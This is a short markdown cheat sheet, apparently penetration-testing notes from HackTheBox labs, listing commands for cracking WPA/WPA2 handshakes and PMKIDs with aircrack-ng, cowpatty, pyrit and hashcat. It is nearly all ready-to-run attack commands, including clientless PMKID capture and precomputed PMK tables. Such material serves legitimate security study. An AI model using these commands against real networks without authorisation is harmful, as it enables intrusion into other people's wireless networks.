#wifi #cracking #pmkid #cowpatty #pyrit #hashcat

# Wi-Fi Password Cracking

WPA/WPA2 handshake + PMKID cracking. Related: [wpa-wpa2](wpa-wpa2.md) · [tools](tools.md) · [hashcat](../Passwords/hashcat.md)

## aircrack-ng
```bash
aircrack-ng -w /opt/wordlist.txt HTB.pcap
```
Crack a WPA/WPA2-PSK handshake.

```bash
aircrack-ng --new-session current.session -w /opt/wordlist.txt,rockyou.txt HTB.cap
```
Crack with multiple wordlists + resumable session (`--restore-session`).

## cowpatty (+ rainbow tables)
```bash
cowpatty -c -r WPA-01.cap
```
Validate that a capture contains a full handshake.

```bash
genpmk -f /opt/rockyou.txt -d /tmp/hashtable -s HackTheBox
```
Precompute a PMK rainbow table for an ESSID.

```bash
cowpatty -d /tmp/hashtable -r WPA-01.cap -s HackTheBox
```
Crack using the precomputed table.

## pyrit
```bash
pyrit -r capture.pcap -o handshakes.pcap strip
```
Extract handshakes from a capture.

```bash
pyrit -r handshakes.pcap -e '<ESSID>' -i /opt/wordlist.txt attack_passthrough
```
Direct dictionary attack.

```bash
pyrit -i /opt/wordlist.txt import_passwords; pyrit batch; pyrit -r HTB-01.cap -e '<ESSID>' attack_db
```
Precompute PMKs to a DB, then crack against it.

## PMKID
```bash
python3 capture_pmkid.py wlan0 "<ESSID>"
```
Capture a PMKID (clientless).

```bash
hashcat -m 22000 pmkid.capture /opt/rockyou.txt
```
Crack the PMKID/handshake hash. See [hashcat](../Passwords/hashcat.md) for `hcxpcapngtool` conversion.

```bash
python3 pmkidcracker.py -s "<SSID>" -ap "<AP_MAC>" -c "<CLIENT_MAC>" -p "<PMKID_VALUE>" -w /opt/wordlist.txt -t 50
```
Crack a PMKID with a standalone cracker.
